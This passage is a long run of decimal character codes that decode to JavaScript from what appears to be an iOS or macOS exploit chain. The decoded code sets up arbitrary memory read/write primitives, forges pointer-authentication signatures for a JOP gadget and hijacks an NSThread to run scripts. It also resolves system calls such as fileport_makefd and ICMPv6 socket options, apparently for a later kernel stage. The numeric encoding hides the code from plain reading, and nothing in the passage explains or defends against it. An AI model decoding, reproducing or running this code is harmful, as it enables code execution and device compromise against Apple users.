114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 115, 101, 116, 117, 112, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 32, 32, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 61, 32, 48, 120, 52, 57, 49, 49, 110, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 32, 61, 32, 112, 97, 99, 105, 98, 40, 106, 115, 118, 109, 95, 105, 115, 78, 65, 78, 95, 102, 99, 97, 108, 108, 95, 103, 97, 100, 103, 101, 116, 44, 32, 115, 105, 103, 110, 105, 110, 103, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 105, 115, 110, 97, 110, 95, 99, 111, 100, 101, 95, 112, 116, 114, 44, 32, 115, 105, 103, 110, 101, 100, 95, 102, 99, 97, 108, 108, 95, 97, 100, 100, 114, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 114, 114, 97, 121, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 32, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 32, 43, 32, 48, 120, 56, 110, 41, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 61, 32, 117, 114, 101, 97, 100, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 97, 100, 100, 114, 32, 43, 32, 48, 120, 49, 48, 110, 41, 59, 10, 10, 32, 32, 32, 32, 109, 101, 109, 99, 112, 121, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 44, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 41, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 51, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 116, 97, 114, 103, 101, 116, 95, 116, 104, 114, 101, 97, 100, 95, 97, 114, 103, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 53, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 54, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 112, 99, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 110, 101, 119, 95, 102, 117, 110, 99, 95, 111, 102, 102, 115, 101, 116, 115, 95, 98, 117, 102, 102, 101, 114, 32, 43, 32, 40, 55, 110, 32, 42, 32, 48, 120, 56, 110, 41, 44, 32, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 97, 114, 103, 115, 41, 59, 10, 10, 32, 32, 32, 32, 105, 102, 32, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 61, 61, 32, 48, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 32, 61, 32, 109, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 70, 111, 114, 83, 101, 108, 101, 99, 116, 111, 114, 40, 99, 116, 120, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 32, 32, 32, 32, 61, 32, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 87, 105, 116, 104, 77, 101, 116, 104, 111, 100, 83, 105, 103, 110, 97, 116, 117, 114, 101, 40, 105, 110, 118, 111, 107, 101, 95, 99, 108, 97, 115, 115, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 115, 105, 103, 110, 97, 116, 117, 114, 101, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 115, 101, 108, 101, 99, 116, 111, 114, 95, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 41, 44, 32, 49, 110, 41, 59, 10, 32, 32, 32, 32, 125, 10, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 99, 116, 120, 41, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 115, 101, 116, 65, 114, 103, 117, 109, 101, 110, 116, 95, 97, 116, 73, 110, 100, 101, 120, 40, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 110, 101, 119, 95, 117, 105, 110, 116, 54, 52, 95, 116, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 44, 32, 50, 110, 41, 59, 10, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 61, 32, 111, 98, 106, 99, 95, 97, 108, 108, 111, 99, 40, 110, 115, 116, 104, 114, 101, 97, 100, 95, 99, 108, 97, 115, 115, 41, 59, 10, 32, 32, 32, 32, 105, 110, 105, 116, 87, 105, 116, 104, 84, 97, 114, 103, 101, 116, 95, 115, 101, 108, 101, 99, 116, 111, 114, 95, 111, 98, 106, 101, 99, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 101, 118, 97, 108, 117, 97, 116, 101, 83, 99, 114, 105, 112, 116, 95, 105, 110, 118, 111, 99, 97, 116, 105, 111, 110, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 110, 118, 111, 107, 101, 44, 32, 48, 110, 41, 59, 10, 32, 32, 32, 32, 110, 115, 116, 104, 114, 101, 97, 100, 95, 115, 116, 97, 114, 116, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 114, 101, 116, 117, 114, 110, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 32, 58, 32, 110, 115, 116, 104, 114, 101, 97, 100, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 99, 116, 120, 34, 32, 58, 32, 99, 116, 120, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 32, 58, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 32, 58, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 32, 58, 32, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 44, 10, 32, 32, 32, 32, 125, 59, 10, 125, 10, 10, 102, 117, 110, 99, 116, 105, 111, 110, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 95, 106, 111, 105, 110, 40, 106, 115, 95, 116, 104, 114, 101, 97, 100, 41, 10, 123, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 99, 116, 120, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 99, 116, 120, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 34, 93, 59, 10, 32, 32, 32, 32, 108, 101, 116, 32, 110, 115, 116, 104, 114, 101, 97, 100, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 61, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 116, 104, 114, 101, 97, 100, 95, 104, 97, 110, 100, 108, 101, 34, 93, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 119, 97, 105, 116, 32, 117, 110, 116, 105, 108, 32, 116, 104, 101, 32, 116, 104, 114, 101, 97, 100, 32, 105, 115, 32, 102, 105, 110, 105, 115, 104, 101, 100, 32, 97, 110, 100, 32, 114, 101, 108, 101, 97, 115, 101, 32, 105, 116, 10, 32, 32, 32, 32, 119, 104, 105, 108, 101, 32, 40, 116, 114, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 108, 101, 116, 32, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 32, 111, 98, 106, 99, 95, 109, 115, 103, 83, 101, 110, 100, 40, 110, 115, 116, 104, 114, 101, 97, 100, 44, 32, 115, 101, 108, 101, 99, 116, 111, 114, 95, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 41, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 105, 102, 32, 40, 105, 115, 70, 105, 110, 105, 115, 104, 101, 100, 32, 61, 61, 32, 49, 110, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 98, 114, 101, 97, 107, 59, 10, 32, 32, 32, 32, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 110, 115, 116, 104, 114, 101, 97, 100, 41, 59, 10, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 54, 52, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 118, 101, 114, 116, 32, 114, 119, 56, 32, 112, 114, 105, 109, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 114, 119, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 117, 119, 114, 105, 116, 101, 54, 52, 40, 117, 114, 101, 97, 100, 54, 52, 40, 111, 98, 106, 101, 99, 116, 70, 111, 114, 75, 101, 121, 101, 100, 83, 117, 98, 115, 99, 114, 105, 112, 116, 40, 106, 115, 95, 99, 116, 120, 44, 32, 99, 102, 115, 116, 114, 95, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 41, 32, 43, 32, 48, 120, 56, 110, 41, 32, 43, 32, 48, 120, 49, 48, 110, 44, 10, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 32, 106, 115, 95, 116, 104, 114, 101, 97, 100, 91, 34, 99, 111, 110, 116, 114, 111, 108, 95, 97, 114, 114, 97, 121, 95, 56, 95, 98, 117, 102, 102, 101, 114, 95, 98, 107, 34, 93, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 106, 115, 32, 99, 111, 110, 116, 101, 120, 116, 10, 32, 32, 32, 32, 108, 101, 116, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 32, 61, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 116, 97, 105, 110, 67, 111, 117, 110, 116, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 102, 111, 114, 32, 40, 108, 101, 116, 32, 105, 32, 61, 32, 48, 110, 59, 32, 105, 32, 60, 32, 106, 115, 99, 95, 114, 101, 102, 95, 99, 111, 117, 110, 116, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 111, 98, 106, 101, 99, 116, 95, 114, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 99, 116, 120, 41, 59, 10, 32, 32, 32, 32, 125, 10, 32, 32, 32, 32, 47, 47, 32, 114, 101, 108, 101, 97, 115, 101, 32, 116, 97, 114, 103, 101, 116, 32, 106, 115, 32, 115, 99, 114, 105, 112, 116, 10, 32, 32, 32, 32, 67, 70, 82, 101, 108, 101, 97, 115, 101, 40, 106, 115, 95, 115, 99, 114, 105, 112, 116, 95, 110, 115, 115, 116, 114, 105, 110, 103, 41, 59, 10, 32, 32, 32, 32, 47, 47, 32, 102, 114, 101, 101, 32, 106, 111, 112, 32, 99, 104, 97, 105, 110, 32, 112, 114, 111, 112, 101, 114, 116, 105, 101, 115, 10, 32, 32, 32, 32, 102, 114, 101, 101, 40, 106, 111, 112, 95, 99, 104, 97, 105, 110, 95, 105, 110, 102, 111, 91, 34, 106, 115, 118, 109, 95, 102, 99, 97, 108, 108, 95, 98, 117, 102, 102, 34, 93, 41, 59, 10, 125, 10, 108, 101, 116, 32, 82, 84, 76, 68, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 48, 120, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 70, 69, 110, 59, 10, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 65, 78, 89, 87, 72, 69, 82, 69, 32, 61, 32, 49, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 70, 73, 88, 69, 68, 32, 61, 32, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 79, 86, 69, 82, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 70, 76, 65, 71, 83, 95, 82, 65, 78, 68, 79, 77, 95, 65, 68, 68, 82, 32, 61, 32, 56, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 73, 78, 72, 69, 82, 73, 84, 95, 78, 79, 78, 69, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 86, 77, 95, 80, 82, 79, 84, 95, 68, 69, 70, 65, 85, 76, 84, 32, 61, 32, 51, 110, 59, 10, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 82, 69, 65, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 108, 101, 116, 32, 80, 82, 79, 84, 95, 87, 82, 73, 84, 69, 32, 61, 32, 48, 120, 50, 110, 59, 10, 10, 108, 101, 116, 32, 77, 65, 80, 95, 83, 72, 65, 82, 69, 68, 32, 61, 32, 48, 120, 49, 110, 59, 10, 10, 108, 101, 116, 32, 65, 70, 95, 73, 78, 69, 84, 54, 32, 61, 32, 51, 48, 110, 59, 10, 108, 101, 116, 32, 83, 79, 67, 75, 95, 68, 71, 82, 65, 77, 32, 61, 32, 50, 110, 59, 10, 108, 101, 116, 32, 73, 80, 80, 82, 79, 84, 79, 95, 73, 67, 77, 80, 86, 54, 32, 61, 32, 53, 56, 110, 59, 10, 108, 101, 116, 32, 73, 67, 77, 80, 54, 95, 70, 73, 76, 84, 69, 82, 32, 61, 32, 49, 56, 110, 59, 10, 10, 108, 101, 116, 32, 83, 69, 69, 75, 95, 83, 69, 84, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 95, 78, 83, 71, 69, 84, 69, 88, 69, 67, 85, 84, 65, 66, 76, 69, 80, 65, 84, 72, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 95, 78, 83, 71, 101, 116, 69, 120, 101, 99, 117, 116, 97, 98, 108, 101, 80, 97, 116, 104, 34, 41, 59, 10, 108, 101, 116, 32, 65, 67, 67, 69, 83, 83, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 97, 99, 99, 101, 115, 115, 34, 41, 59, 10, 108, 101, 116, 32, 67, 79, 78, 70, 83, 84, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 111, 110, 102, 115, 116, 114, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 78, 84, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 110, 116, 108, 34, 41, 59, 10, 108, 101, 116, 32, 70, 83, 89, 78, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 115, 121, 110, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 70, 68, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 102, 100, 34, 41, 59, 10, 108, 101, 116, 32, 70, 73, 76, 69, 80, 79, 82, 84, 95, 77, 65, 75, 69, 80, 79, 82, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 105, 108, 101, 112, 111, 114, 116, 95, 109, 97, 107, 101, 112, 111, 114, 116, 34, 41, 59, 10, 108, 101, 116, 32, 70, 79, 80, 69, 78, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 111, 112, 101, 110, 34, 41, 59, 10, 108, 101, 116, 32, 70, 67, 76, 79, 83, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 70, 87, 82, 73, 84, 69, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 119, 114, 105, 116, 101, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 83, 79, 67, 75, 79, 80, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 115, 111, 99, 107, 111, 112, 116, 34, 41, 59, 10, 108, 101, 116, 32, 76, 83, 69, 69, 75, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 108, 115, 101, 101, 107, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 67, 72, 95, 84, 72, 82, 69, 65, 68, 95, 83, 69, 76, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 99, 104, 95, 116, 104, 114, 101, 97, 100, 95, 115, 101, 108, 102, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 77, 69, 77, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 109, 101, 109, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 95, 80, 65, 84, 84, 69, 82, 78, 56, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 